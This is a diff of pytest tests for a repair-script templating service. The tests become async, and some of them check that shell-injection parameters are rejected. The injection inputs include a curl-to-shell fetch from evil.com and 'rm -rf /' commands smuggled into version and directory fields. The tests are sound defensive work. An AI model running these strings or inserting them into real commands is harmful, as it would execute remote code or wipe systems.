@@ -35,7 +35,7 @@ _TEMPLATE_PARAMS: dict[str, dict] = {
 
 
 class TestRepairService:
-    def test_list_templates_returns_all(self, service):
+    async def test_list_templates_returns_all(self, service):
         templates = service.list_templates()
         assert len(templates) == 5
         ids = [t["id"] for t in templates]
@@ -45,7 +45,7 @@ class TestRepairService:
         assert "repair_venv_recreate" in ids
         assert "repair_pip_reinstall" in ids
 
-    def test_list_templates_have_descriptions(self, service):
+    async def test_list_templates_have_descriptions(self, service):
         templates = service.list_templates()
         for t in templates:
             assert "id" in t
@@ -53,10 +53,10 @@ class TestRepairService:
             assert len(t["description"]) > 10
 
     @pytest.mark.parametrize("template_id", list(REPAIR_TEMPLATE_MAP.keys()))
-    def test_render_all_templates(self, service, template_id):
+    async def test_render_all_templates(self, service, template_id):
         """Every registered template renders without errors using valid params."""
         params = _TEMPLATE_PARAMS[template_id]
-        result = service.render_repair(template_id, params)
+        result = await service.render_repair(template_id, params)
         assert result["template_id"] == template_id
         assert result["filename"].endswith(".sh")
         assert not result["filename"].endswith(".j2")
@@ -64,73 +64,73 @@ class TestRepairService:
         assert result["size_bytes"] > 0
         assert "EnvForage" in result["content"]
 
-    def test_render_unknown_template_raises(self, service):
+    async def test_render_unknown_template_raises(self, service):
         with pytest.raises(RepairTemplateNotFoundError) as exc_info:
-            service.render_repair("nonexistent_template")
+            await service.render_repair("nonexistent_template")
         assert "nonexistent_template" in str(exc_info.value)
         assert exc_info.value.template_id == "nonexistent_template"
 
-    def test_render_cuda_upgrade_injects_version(self, service):
-        result = service.render_repair(
+    async def test_render_cuda_upgrade_injects_version(self, service):
+        result = await service.render_repair(
             "repair_cuda_upgrade", {"target_cuda_version": "12.4"}
         )
         assert "12.4" in result["content"]
 
-    def test_render_python_install_injects_version(self, service):
-        result = service.render_repair(
+    async def test_render_python_install_injects_version(self, service):
+        result = await service.render_repair(
             "repair_python_install", {"target_python_version": "3.12"}
         )
         assert "3.12" in result["content"]
 
-    def test_render_includes_timestamp(self, service):
-        result = service.render_repair("repair_driver_update")
+    async def test_render_includes_timestamp(self, service):
+        result = await service.render_repair("repair_driver_update")
         assert "Generated:" in result["content"]
 
-    def test_render_includes_envforage_version(self, service):
-        result = service.render_repair("repair_venv_recreate")
+    async def test_render_includes_envforage_version(self, service):
+        result = await service.render_repair("repair_venv_recreate")
         assert "EnvForage" in result["content"]
 
-    def test_output_filename_strips_j2(self, service):
-        result = service.render_repair("repair_cuda_upgrade")
+    async def test_output_filename_strips_j2(self, service):
+        result = await service.render_repair("repair_cuda_upgrade")
         assert result["filename"] == "repair_cuda_upgrade.sh"
 
     # ── Param validation tests ────────────────────────────────────────────────
 
-    def test_unknown_param_key_rejected(self, service):
+    async def test_unknown_param_key_rejected(self, service):
         with pytest.raises(RepairParamError, match="Unknown param"):
-            service.render_repair("repair_cuda_upgrade", {"malicious_key": "bad"})
+            await service.render_repair("repair_cuda_upgrade", {"malicious_key": "bad"})
 
-    def test_shell_injection_in_python_bin_rejected(self, service):
+    async def test_shell_injection_in_python_bin_rejected(self, service):
         with pytest.raises(RepairParamError):
-            service.render_repair(
+            await service.render_repair(
                 "repair_venv_recreate",
                 {"python_bin": "/bin/bash -c 'curl http://evil.com | sh' #"},
             )
 
-    def test_shell_injection_in_venv_dir_rejected(self, service):
+    async def test_shell_injection_in_venv_dir_rejected(self, service):
         with pytest.raises(RepairParamError):
-            service.render_repair(
+            await service.render_repair(
                 "repair_venv_recreate",
                 {"venv_dir": ".venv; rm -rf /"},
             )
 
-    def test_invalid_python_version_format_rejected(self, service):
+    async def test_invalid_python_version_format_rejected(self, service):
         with pytest.raises(RepairParamError):
-            service.render_repair(
+            await service.render_repair(
                 "repair_python_install",
                 {"target_python_version": "3.11 attacker-pkg"},
             )
 
-    def test_invalid_cuda_version_format_rejected(self, service):
+    async def test_invalid_cuda_version_format_rejected(self, service):
         with pytest.raises(RepairParamError):
-            service.render_repair(
+            await service.render_repair(
                 "repair_cuda_upgrade",
                 {"target_cuda_version": "12.1; rm -rf /"},
             )
 
-    def test_package_with_unsafe_name_rejected(self, service):
+    async def test_package_with_unsafe_name_rejected(self, service):
         with pytest.raises(RepairParamError):
-            service.render_repair(
+            await service.render_repair(
                 "repair_pip_reinstall",
                 {
                     "packages": [
@@ -144,9 +144,9 @@ class TestRepairService:
                 },
             )
 
-    def test_package_with_unsafe_index_url_rejected(self, service):
+    async def test_package_with_unsafe_index_url_rejected(self, service):
         with pytest.raises(RepairParamError):
-            service.render_repair(
+            await service.render_repair(
                 "repair_pip_reinstall",
                 {
                     "packages": [
@@ -160,7 +160,7 @@ class TestRepairService:
                 },
             )
 
-    def test_no_params_renders_defaults(self, service):
-        result = service.render_repair("repair_cuda_upgrade", None)
+    async def test_no_params_renders_defaults(self, service):
+        result = await service.render_repair("repair_cuda_upgrade", None)
         assert result["template_id"] == "repair_cuda_upgrade"
         assert len(result["content"]) > 50
